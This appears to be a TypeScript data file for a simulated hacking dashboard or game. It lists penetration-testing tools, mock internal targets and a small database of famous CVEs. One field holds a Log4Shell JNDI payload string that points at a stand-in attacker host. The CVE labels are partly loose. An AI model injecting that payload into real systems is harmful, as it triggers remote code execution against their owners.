
import { PenetrationTool, HackingTarget, Exploit } from './types';

export const penetrationTools: PenetrationTool[] = [
  {
    name: 'Nmap',
    description: 'Network Discovery and Security Auditing',
    version: '7.94',
    status: 'ready',
    category: 'network',
    difficulty: 3
  },
  {
    name: 'Metasploit',
    description: 'Penetration Testing Framework',
    version: '6.3.25',
    status: 'ready',
    category: 'network',
    difficulty: 8
  },
  {
    name: 'Wireshark',
    description: 'Network Protocol Analyzer',
    version: '4.0.8',
    status: 'ready',
    category: 'network',
    difficulty: 5
  },
  {
    name: 'Burp Suite',
    description: 'Web Application Security Testing',
    version: '2023.5.4',
    status: 'ready',
    category: 'web',
    difficulty: 6
  },
  {
    name: 'SQLMap',
    description: 'Automatic SQL Injection Tool',
    version: '1.7.6',
    status: 'ready',
    category: 'web',
    difficulty: 7
  },
  {
    name: 'Aircrack-ng',
    description: 'Wireless Network Security Assessment',
    version: '1.7',
    status: 'ready',
    category: 'wireless',
    difficulty: 6
  },
  {
    name: 'Hydra',
    description: 'Network Login Cracker',
    version: '9.4',
    status: 'ready',
    category: 'network',
    difficulty: 5
  },
  {
    name: 'John The Ripper',
    description: 'Password Security Auditing Tool',
    version: '1.9.0',
    status: 'ready',
    category: 'forensics',
    difficulty: 4
  }
];

export const initialHackingTargets: HackingTarget[] = [
  {
    id: 'target-001',
    name: 'Test Web Server',
    ip: '192.168.1.100',
    status: 'secure',
    riskLevel: 'Medium',
    openPorts: [80, 443, 22],
    services: ['HTTP', 'HTTPS', 'SSH'],
    vulnerabilities: []
  },
  {
    id: 'target-002',
    name: 'Development Database',
    ip: '192.168.1.101',
    status: 'vulnerable',
    riskLevel: 'High',
    openPorts: [3306, 22, 80],
    services: ['MySQL', 'SSH', 'Apache'],
    vulnerabilities: ['CVE-2021-44228', 'CVE-2021-34527']
  },
  {
    id: 'target-003',
    name: 'Mail Server',
    ip: '192.168.1.102',
    status: 'secure',
    riskLevel: 'Low',
    openPorts: [25, 143, 993],
    services: ['SMTP', 'IMAP', 'IMAPS'],
    vulnerabilities: []
  },
  {
    id: 'target-004',
    name: 'File Server',
    ip: '192.168.1.103',
    status: 'vulnerable',
    riskLevel: 'Critical',
    openPorts: [21, 22, 445],
    services: ['FTP', 'SSH', 'SMB'],
    vulnerabilities: ['CVE-2020-1472', 'CVE-2021-26855']
  },
  {
    id: 'target-005',
    name: 'Wireless Access Point',
    ip: '192.168.1.1',
    status: 'scanning',
    riskLevel: 'Medium',
    openPorts: [80, 443],
    services: ['HTTP', 'HTTPS'],
    vulnerabilities: []
  }
];

export const exploitDatabase: Exploit[] = [
  {
    id: 'exploit-001',
    name: 'Log4Shell (CVE-2021-44228)',
    type: 'Remote Code Execution',
    description: 'Critical vulnerability in Apache Log4j library allowing remote code execution',
    severity: 'Critical',
    target: 'Apache Log4j 2.x',
    payload: '${jndi:ldap://attacker.com/exploit}',
    discovered: true
  },
  {
    id: 'exploit-002',
    name: 'PrintNightmare (CVE-2021-34527)',
    type: 'Privilege Escalation',
    description: 'Windows Print Spooler privilege escalation vulnerability',
    severity: 'High',
    target: 'Windows Print Spooler',
    payload: 'AddPrinterDriverEx exploit',
    discovered: true
  },
  {
    id: 'exploit-003',
    name: 'Zerologon (CVE-2020-1472)',
    type: 'Authentication Bypass',
    description: 'Windows Netlogon privilege escalation vulnerability',
    severity: 'Critical',
    target: 'Windows Netlogon',
    payload: 'Netlogon authentication bypass',
    discovered: true
  },
  {
    id: 'exploit-004',
    name: 'ProxyShell (CVE-2021-26855)',
    type: 'Remote Code Execution',
    description: 'Microsoft Exchange Server remote code execution vulnerability',
    severity: 'Critical',
    target: 'Microsoft Exchange Server',
    payload: 'SSRF to RCE chain',
    discovered: true
  },
  {
    id: 'exploit-005',
    name: 'BlueKeep (CVE-2019-0708)',
    type: 'Remote Code Execution',
    description: 'Windows Remote Desktop Services vulnerability',
    severity: 'Critical',
    target: 'Windows RDP',
    payload: 'RDP protocol exploitation',
    discovered: false
  },
  {
    id: 'exploit-006',
    name: 'EternalBlue (CVE-2017-0144)',
    type: 'Remote Code Execution',
    description: 'Windows SMB protocol vulnerability',
    severity: 'High',
    target: 'Windows SMB',
    payload: 'SMB buffer overflow',
    discovered: true
  }
];
